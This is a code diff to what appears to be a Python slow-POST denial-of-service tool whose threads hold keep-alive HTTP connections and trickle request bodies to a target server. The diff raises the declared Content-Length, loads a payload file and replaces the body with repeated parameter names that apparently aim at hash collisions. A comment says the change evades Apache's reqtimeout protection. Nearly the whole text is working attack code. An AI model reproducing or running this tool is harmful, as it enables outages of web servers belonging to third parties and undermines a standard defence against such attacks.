@@ -6,6 +6,10 @@ from time import sleep
 import socket
 import threading
 
+
+f = open("payload.txt",'r')
+payload = f.readlines()[0]
+
 def openConnections(url, threads, sleepTime) :
 	urlParts = urlparse(url)
 	if (urlParts.scheme != 'http'):
@@ -55,13 +59,13 @@ class Worker (threading.Thread):
                         'POST ' + self.path + ' HTTP/1.1\r\n' +
                         'Host: ' + self.host + '\r\n' +
                         'Connection: keep-alive\r\n' +
-                        'Content-Length: 1000000\r\n' +
+                        'Content-Length: 100000000\r\n' +
                         '\r\n'
                         )
 
 		while not self.stopped:
 			#Modified by W0rmB00t: Larger request to avoid apache2 module reqtimeout
-			s.send('abc=123123123123123123123123123111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigk1uh2egfwielgwgbwkgbawregfklawqgrblkaqwrgebleaigkrrrrrrrrrrrrrrrrrr&')
+			s.send("EzEzEzEzEzEzEzEzEzEzEzEzEzEzEz=&EzEzEzEzEzEzEzEzEzEzEzEzEzEzFY=&EzEzEzEzEzEzEzEzEzEzEzEzEzFYEz=&EzEzEzEzEzEzEzEzEzEzEzEzEzFYFY=&EzEzEzEzEzEzEzEzEzEzEzEzFYEzEz=&EzEzEzEzEzEzEzEzEzEzEzEzFYEzFY=&EzEzEzEzEzEzEzEzEzEzEzEzFYFYEz=&EzEzEzEzEzEzEzEzEzEzEzEzFYFYFY=&EzEzEzEzEzEzEzEzEzEzEzFYEzEzEz=&EzEzEzEzEzEzEzEzEzEzEzFYEzEzFY=&EzEzEzEzEzEzEzEzEzEzEzFYEzFYEz=&EzEzEzEzEzEzEzEzEzEzEzFYEzFYFY=&EzEzEzEzEzEzEzEzEzEzEzFYFYEzEz=&EzEzEzEzEzEzEzEzEzEzEzFYFYEzFY=&EzEzEzEzEzEzEzEzEzEzEzFYFYFYEz=&EzEzEzEzEzEzEzEzEzEzEzFYFYFYFY=&EzEzEzEzEzEzEzEzEzEzFYEzEzEzEz=&EzEzEzEzEzEzEzEzEzEzFYEzEzEzFY=&EzEzEzEzEzEzEzEzEzEzFYEzEzFYEz=&EzEzEzEzEzEzEzEzEzEzFYEzEzFYFY=&EzEzEzEzEzEzEzEzEzEzFYEzFYEzEz=&EzEzEzEzEzEzEzEzEzEzFYEzFYEzFY=&EzEzEzEzEzEzEzEzEzEzFYEzFYFYEz=&EzEzEzEzEzEzEzEzEzEzFYEzFYFYFY=&EzEzEzEzEzEzEzEzEzEzFYFYEzEzEz=&EzEzEzEzEzEzEzEzEzEzFYFYEzEzFY=&EzEzEzEzEzEzEzEzEzEzFYFYEzFYEz=&EzEzEzEzEzEzEzEzEzEzFYFYEzFYFY=&EzEzEzEzEzEzEzEzEzEzFYFYFYEzEz=&EzEzEzEzEzEzEzEzEzEzFYFYFYEzFY=&EzEzEzEzEzEzEzEzEzEzFYFYFYFYEz=&EzEzEzEzEzEzEzEzEzEzFYFYFYFYFY=&EzEzEzEzEzEzEzEzEzFYEzEzEzEzEz=&EzEzEzEzEzEzEzEzEzFYEzEzEzEzFY=&EzEzEzEzEzEzEzEzEzFYEzEzEzFYEz=&EzEzEzEzEzEzEzEzEzFYEzEzEzFYFY=&EzEzEzEzEzEzEzEzEzFYEzEzFYEzEz=&EzEzEzEzEzEzEzEzEzFYEzEzFYEzFY=&EzEzEzEzEzEzEzEzEzFYEzEzFYFYEz=&EzEzEzEzEzEzEzEzEzFYEzEzFYFYFY=&EzEzEzEzEzEzEzEzEzFYEzFYEzEzEz=&EzEzEzEzEzEzEzEzEzFYEzFYEzEzFY=&EzEzEzEzEzEzEzEzEzFYEzFYEzFYEz=&EzEzEzEzEzEzEzEzEzFYEzFYEzFYFY=&EzEzEzEzEzEzEzEzEzFYEzFYFYEzEz=&EzEzEzEzEzEzEzEzEzFYEzFYFYEzFY=&EzEzEzEzEzEzEzEzEzFYEzFYFYFYEz=&EzEzEzEzEzEzEzEzEzFYEzFYFYFYFY=&EzEzEzEzEzEzEzEzEzFYFYEzEzEzEz=&EzEzEzEzEzEzEzEzEzFYFYEzEzEzFY=&EzEzEzEzEzEzEzEzEzFYFYEzEzFYEz=&EzEzEzEzEzEzEzEzEzFYFYEzEzFYFY")
 			sleep(self.sleepTime/500) 
 
 		s.close
